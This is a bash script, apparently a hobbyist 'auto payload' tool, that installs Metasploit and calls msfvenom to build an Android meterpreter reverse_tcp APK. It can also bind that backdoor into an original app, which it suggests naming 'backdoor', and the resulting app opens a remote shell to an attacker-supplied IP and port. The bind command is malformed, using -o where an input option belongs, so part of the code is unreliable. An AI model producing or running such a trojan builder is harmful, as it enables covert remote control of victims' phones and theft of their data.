#!/bin/bash
# auto payload with metaspolit framework
# only same network
pkg install figlet >/dev/null 2>&1
sudo apt-get install figlet >/dev/null 2>&1
echo -e '\e[33m'
figlet -f slant Auto Payload
echo -e '\e[31m Author Bhone Myat Han \e[0m'
echo -e '\e[0m'
if [[ -d "metasploit-framework" ]]
then
  echo -e '\e[41m      [+]creat payload app using metasploit framework[+]      \e[0m'
  echo ""
  echo -e '\e[40m      Payload apk in metasploit-framework/payloads folder     \e[0m'
  echo ""
  echo -e '\e[31m  [+]Other OS not included Termux Run this script with Superuser sudo su[+] \e[0m'
  echo ""
  echo -e '\e[46m Please choose options \e[0m'
  echo -e '\e[36m 1)Normal Payload(not worked in android version 9,10,..) \e[0m'
  echo -e '\e[36m 2)Bind Payload(Bind in orginal apk and worked in all android versions) \e[0m'
  read -p $'\e[1;32m Please enter option number: \e[0m' opt
  if [[ $opt == 1 ]]
  then 
  cd metasploit-framework
  sudo mkdir payloads >/dev/null  2>&1
  mkdir payloads >/dev/null 2>&1
  read -p $'\e[1;34m Enter your listening ip address::\e[0m' ip
  read -p $'\e[1;34m Enter your listening port number:: \e[0m' port
  read -p $'\e[1;36m Enter your payload app name(eg-backdoor):: \e[0m' name
  echo -e '\e[40m Payload apk start creat\e[0m'
  ./msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R> payloads/$name.apk
  echo ""
  echo -e '\e[40m Payload apk creat success \e[0m'
  fi
  if [[ $opt == 2 ]]
  then
  cd metasploit-framework
  sudo mkdir payloads >/dev/null  2>&1
  mkdir payloads >/dev/null 2>&1
  read -p $'\e[1;34m Enter your listening ip address:: \e[0m' ip
  read -p $'\e[1;34m Enter your listening port number:: \e[0m' port
  read -p $'\e[1;36m Enter your original apk dir(eg-../Desktop/original.apk):: \e[0m' org
  read -p $'\e[1;36m Enter your payload app name(eg-backdoor):: \e[0m' name
  echo echo -e '\e[40m Payload apk start bind\e[0m'
  ./msfvenom -o $org android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o payloads/$name.apk
  echo ""
  echo -e '\e[40m Payload apk creat success \e[0m'
  fi
  else 
  echo -e '\e[41m      Now we install required dependencies and metaspolit-framework      \e[0m'
  echo ""
  echo -e '\e[32m Choose Your Options (Termux or Other OS like Ubuntu) \e[0m'
  echo -e '\e[32m 1.Termux \e[0m'
  echo -e '\e[32m 2.Other os (Ubuntu,etc...) \e[0m'
  echo ""
  read -p ' Choose Option::>' os
  case $os in
  1)
    echo -e '\e[41m Please wait for a few minutes... \e[0m'
  cd ../
  git clone https://github.com/Lexiie/Termux-Apktool >/dev/null 2>&1
  cd Termux-Apktool
  dpkg -i apktool_2.3.4_all.deb >/dev/null 2>&1
  cd ../
  cd auto_payload 
  apt install -y build-essential zlib1g zlib1g-dev libpq-dev libpcap-dev libsqlite3-dev ruby ruby-dev >/dev/null 2>&1
  git clone https://github.com/rapid7/metasploit-framework.git
  cd metasploit-framework
  gem install bundler  >/dev/null 2>&1
  bundle install  >/dev/null 2>&1
  cd ../
  cd auto_payload
  bash auto_payload.sh
  ;;
  2)
  if [ "$EUID" -ne 0 ]
  then echo "Please run as root sudo su"
  else
  echo ""
  echo -e '\e[41m Please wait for a few minutes... \e[0m'
  sudo apt install apktool >/dev/null 2>&1
  apt install -y build-essential zlib1g zlib1g-dev libpq-dev libpcap-dev libsqlite3-dev ruby ruby-dev >/dev/null 2>&1
  git clone https://github.com/rapid7/metasploit-framework.git
  cd metasploit-framework
  sudo gem install bundler >/dev/null 2>&1
  bundle install >/dev/null 2>&1
  cd ../
  bash auto_payload.sh
  fi
  ;;
  *)
   exit
  ;;
  esac
  
  fi
